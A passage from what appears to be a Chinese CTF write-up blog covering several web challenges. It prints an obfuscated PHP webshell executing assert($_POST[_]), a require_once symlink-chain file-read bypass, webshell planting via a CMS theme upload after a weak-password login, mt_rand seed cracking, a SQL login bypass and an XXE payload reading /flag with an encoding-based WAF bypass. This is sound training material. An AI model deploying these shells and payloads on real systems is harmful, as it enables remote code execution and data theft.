= ~(欣);<br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-regexp">//</span>_POS<br><span class="hljs-variable">$__</span> = ~(站);<br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-regexp">//</span>_POST<br><br><span class="hljs-variable">$_</span>=$<span class="hljs-variable">$____</span>;<span class="hljs-regexp">//</span><span class="hljs-variable">$_POST</span><br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<span class="hljs-regexp">//</span>assert(<span class="hljs-variable">$_POST</span>[_])<br></code></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//shell.txt</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$__</span>=[];<br><span class="hljs-variable">$_</span>=(<span class="hljs-variable">$__</span>==<span class="hljs-variable">$__</span>);<br><span class="hljs-variable">$__</span>=~(融);<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(匆);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>].<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(随);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(千);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(苦);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$____</span>=~(~(_));<br><span class="hljs-variable">$__</span>=~(诗);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(尘);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(欣);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(站);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<br></code></pre></td></tr></table></figure>

<p>上传成功进行rce</p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404212201756.png" srcset="/img/loading.gif" lazyload alt="image-20240421220049082"></p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404212201110.png" srcset="/img/loading.gif" lazyload alt="image-20240421220132989"></p>
<h2 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>require_once()</code>，这个函数的特点是只包含一次，因为刚才是已经<code>require_once &#39;flag.php&#39;</code>了，不能再次包含。所以需要绕过<code>require_once()</code>，让它检测传入的文件名哈希值既没有重复，又能读到flag.php这个文件。</p>
<p><code>require_once()</code>在对软链接的操作上存在一些缺陷，软连接层数较多会使hash匹配直接失效造成重复包含，超过20次软链接后可以绕过，外加伪协议编码一下：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>var<span class="hljs-regexp">/www/</span>html/flag.php<br></code></pre></td></tr></table></figure>

<h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><p>提示5位弱密码</p>
<p>&#x2F;admin.php 使用admin和12345登录后台</p>
<p>发现主题可以上传，需要创建如下文件</p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405072029587.png" srcset="/img/loading.gif" lazyload alt="image-20210829200802221"></p>
<p>在设计-组件-素材库里可以上传txt文件然后重命名</p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405072031739.png" srcset="/img/loading.gif" lazyload alt="image-20240507203150671"></p>
<p>直接在高级里更改，加个马</p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405072034540.png" srcset="/img/loading.gif" lazyload alt="image-20240507203423468"></p>
<p>蚁剑连接</p>
<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405082146551.png" srcset="/img/loading.gif" lazyload alt="image-20240508214611419"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&#x27;http://f9a52959-cb54-4ea7-b20c-864efeff6d09.node5.buuoj.cn:81//&#x27;</span><br>session = requests.session()<br>res = session.get(url)<br>res = res.text<br><span class="hljs-built_in">print</span>(res)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1010</span>):<br>    <span class="hljs-keyword">try</span>:<br>        result = re.findall(<span class="hljs-string">&quot;\&lt;br\&gt;\&lt;br\&gt;(\d.*?)\&lt;br\&gt;\&lt;br\&gt;&quot;</span>,res)<span class="hljs-comment">#获取[数字]</span><br>        result = <span class="hljs-string">&quot;&quot;</span>.join(result)<span class="hljs-comment">#提取字符串</span><br>        result = <span class="hljs-built_in">eval</span>(result)<span class="hljs-comment">#运算</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;time: &quot;</span>+ <span class="hljs-built_in">str</span>(i) +<span class="hljs-string">&quot;   &quot;</span>+<span class="hljs-string">&quot;result: &quot;</span>+ <span class="hljs-built_in">str</span>(result))<br><br>        data = &#123;<span class="hljs-string">&quot;answer&quot;</span>:result&#125;<br>        res = session.post(url,data=data).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&#123;&quot;</span> <span class="hljs-keyword">in</span> res:<br>            <span class="hljs-built_in">print</span>(re.search(<span class="hljs-string">&quot;flag&#123;.*&#125;&quot;</span>, res).group(<span class="hljs-number">0</span>)[:<span class="hljs-number">50</span>])<br>            <span class="hljs-keyword">break</span><br>        time.sleep(<span class="hljs-number">0.1</span>)<span class="hljs-comment">#防止访问太快断开连接</span><br>    <span class="hljs-keyword">except</span>: <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p><a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$Private_key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Private_key&#x27;</span>];<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$username</span> == <span class="hljs-string">&#x27;&#x27;</span>) || (<span class="hljs-variable">$password</span> == <span class="hljs-string">&#x27;&#x27;</span>) ||(<span class="hljs-variable">$Private_key</span> == <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>        <span class="hljs-comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>&#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> != <span class="hljs-string">&#x27;*************&#x27;</span> )<br>    &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> === <span class="hljs-string">&#x27;************&#x27;</span>)&#123;<br>        <span class="hljs-variable">$getuser</span> = <span class="hljs-string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>.<span class="hljs-string">&#x27;;&#x27;</span>; <br>        <span class="hljs-variable">$link</span>=<span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br>        <span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-variable">$link</span>);<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$getuser</span>);<br>        <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysql_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;flag&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    &#125;<br><br>&#125; <br><span class="hljs-comment">// genarate public_key </span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">16</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings1</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$public_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$public_key</span> .= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$strings1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$strings1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$public_key</span>;<br>  &#125;<br><br>  <span class="hljs-comment">//genarate private_key</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">12</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings2</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$private_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$private_key</span> .= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$strings2</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$strings2</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$private_key</span>;<br>  &#125;<br><span class="hljs-comment">//   $Public_key = public_key();</span><br><span class="hljs-comment">// $Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span><br></code></pre></td></tr></table></figure>

<p>只有当username，password和private_key全部正确时，才会获取flag。<br>对于username和password，由于是sql查询，可以万能密码进行绕过，剩下的问题是获取private_key。</p>
<p>发现mt_rand(),想到mt_rand()伪随机数</p>
<p>告诉了我们$Public_key &#x3D; KVQP0LdJKRaV3n9D，通过php_mt_seed工具来获取种子值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">str1 =<span class="hljs-string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span><br>str2 = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span><br>result =<span class="hljs-string">&#x27;&#x27;</span><br><br>length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(str2)-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(str1)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(str2)):<br>        <span class="hljs-keyword">if</span> str1[i] ==  str2[j]:<br>            result += <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27; &#x27;</span> +<span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-string">&#x27;0&#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span> + length + <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(result)<br><br><span class="hljs-comment">#36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 </span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405102214418.png" srcset="/img/loading.gif" lazyload alt="image-20240510221445298"></p>
<p>得到种子值就能得到$private_key&#x3D;XuNhoueCDCGc（注意php版本不同，得到的随机数不同）</p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405102216631.png" srcset="/img/loading.gif" lazyload alt="image-20240510221623567"></p>
<p>成功登录得到flag </p>
<h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406032115701.png" srcset="/img/loading.gif" lazyload alt="image-20240603211522641"></p>
<p>提示上传xml，flag在根目录</p>
<p>xxe漏洞</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">users</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>gg<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>ggg<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>alice@fakesite.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>CSAW2019<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">intro</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">intro</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>bob<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> Bob<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>bob@fakesite.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>CSAW2019<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">intro</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">intro</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>提示waf，要绕过</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">一个xml文档不仅可以用UTF-<span class="hljs-number">8</span>编码，也可以用<span class="hljs-built_in">UTF-16</span>(两个变体 - BE和LE)、<span class="hljs-built_in">UTF-32</span>(四个变体 - BE、LE、<span class="hljs-number">2143</span>、<span class="hljs-number">3412</span>)和EBCDIC编码。<br><br>在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。<br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> <span class="hljs-number">1</span>.xml | iconv -f UTF-<span class="hljs-number">8</span> -t UTF-<span class="hljs-number">16</span>BE &gt; x16.xml<br></code></pre></td></tr></table></figure>

<p>转为16进制上传</p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406032119661.png" srcset="/img/loading.gif" lazyload alt="image-20240603211922589"></p>
<h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br>           <br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>审计代码</p>
<p>反序列化</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">if</span>( ($<span class="hljs-keyword">this</span>-&gt;syc != $<span class="hljs-keyword">this</span>-&gt;lover) &amp;&amp; (md5($<span class="hljs-keyword">this</span>-&gt;syc) === md5($<span class="hljs-keyword">this</span>-&gt;lover)) &amp;&amp; (sha1($<span class="hljs-keyword">this</span>-&gt;syc)=== sha1($<span class="hljs-keyword">this</span>-&gt;lover)) )<br></code></pre></td></tr></table></figure>

<p>绕过该条件，在类中不能数组绕过，使用php原生类绕过</p>
